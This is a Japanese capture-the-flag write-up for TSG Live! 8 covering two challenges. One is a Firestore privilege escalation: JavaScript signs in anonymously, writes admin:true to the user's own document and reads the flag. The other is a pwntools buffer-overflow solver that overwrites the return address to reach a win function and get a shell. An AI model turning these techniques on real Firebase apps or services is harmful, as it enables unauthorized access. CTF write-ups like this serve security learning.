# TSG Live! 8 CTF Writeup

## 目次

- Web
  - [Problem on fire](#problem-on-fire)
- Pwn
  - [bpxover](#bpxover)

## Problem on fire

開くと`FirebaseError: [code=permission-denied]: Missing or insufficient permissions.`というエラーが表示されています。ソースコードを見ると`firestore.rules`に

> // 自分のユーザー情報を書き込めるのは自分のみ  
> // 一度作ったユーザー情報を編集できるのはadminだけ  
> // flagを読めるのはadminだけ  

というコメントがあり、自分のユーザー情報をadminにできればいいということがわかります。  
以下のJavaScriptコードをコンソールで実行するとフラグが得られます。

```js
const db = firebase.firestore();
const auth = firebase.auth();
const {user} = await auth.signInAnonymously();
const token = await user.getIdToken();
const uid = user.uid;
await db.collection('users').doc(uid).set({admin: true});
flag = await db.collection('flags').doc('flag').get();
console.log(flag.get("value"));
```

## bpxover

ソースコードを見るとアセンブリを実行していますが、それは関係なくBoFの脆弱性があります。winに飛ばせばよいです。  
以下のソルバでシェルが取れるので、`cat flag`とかすればフラグが得られます。

```py
from pwn import *

io = process(["nc", "chall.live.ctf.tsg.ne.jp", "30006"])

win_addr = p64(0x00000000004011b6)
main_addr = p64(0x00000000004011f0)
buf_size = 16

payload = b"\x00" * (buf_size + 24) + win_addr
print(payload)
print(io.recvline())
io.sendline(payload)

io.interactive()
```
